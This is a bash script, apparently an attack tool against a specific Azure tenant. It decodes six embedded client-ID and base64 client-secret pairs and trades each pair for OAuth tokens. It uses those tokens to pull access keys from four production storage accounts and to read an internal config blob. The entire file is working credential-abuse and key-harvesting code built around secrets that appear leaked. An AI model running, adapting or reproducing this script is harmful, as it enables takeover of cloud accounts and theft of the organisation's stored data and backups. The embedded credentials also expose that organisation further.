#!/usr/bin/env bash
set -uo pipefail
TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"; SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"; RG=rg-tbl-platform-prod-sea
while IFS='|' read -r APP SECB; do
  [ -z "$APP" ] && continue
  SECRET=$(printf '%s' "$SECB" | base64 -d 2>/dev/null)
  echo "### $APP secret_len=${#SECRET}"
  for S in https://management.azure.com/.default https://storage.azure.com/.default; do
    T=$(curl -sS -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" --data-urlencode "client_id=$APP" --data-urlencode "client_secret=$SECRET" --data-urlencode "scope=$S" --data-urlencode "grant_type=client_credentials" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
    echo "  scope=$S len=${#T}"
    if [ -n "$T" ] && [ "${S:8:5}" = "manag" ]; then
      for A in sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
        echo -n "    listKeys $A: "
        curl -sS -H "Authorization: Bearer $T" -H "Content-Length: 0" -X POST "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.Storage/storageAccounts/${A}/listKeys?api-version=2023-01-01" | head -c 200; echo
      done
    fi
    if [ -n "$T" ] && [ "${S:8:5}" = "stora" ]; then
      echo -n "    blob read: "
      curl -sS -H "Authorization: Bearer $T" -H "x-ms-version: 2021-08-06" "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" | head -c 300; echo
    fi
  done
done <<'CREDS'
038bc35d-131d-4953-9985-ff4a245ccec1|MUJFOFF+eUdROGVfejZWQmN6bEdKOFllT0hnTlJVZmZiZ051ZmIybQ==
2c34300e-1bc0-41e7-9c1e-8b7571d72c72|QWw3OFF+bjViZG9PM3JrQ2p1bzJKSTJOSHFhZ0pvb2Fac2ZYTmNtNg==
12ed54de-f2eb-4784-804c-3a7a3e83a9e9|blA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeg==
462d1c38-4459-48b8-9333-82e389e59514|c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==
881fddce-6208-4af5-a297-7e79c912f83c|LVRsOFF+c0gwUU9QLlZyS1doYTMtN3g0WEEySnhTNGowOG51dmJRTg==
58108da8-044e-4d7e-9a46-92e6179b30be|fjhUOFF+WXdFbWV4U1RSdl9wVXNFd2E5UU1hcHlQMzl+Q1U1VWN1Mg==CREDS
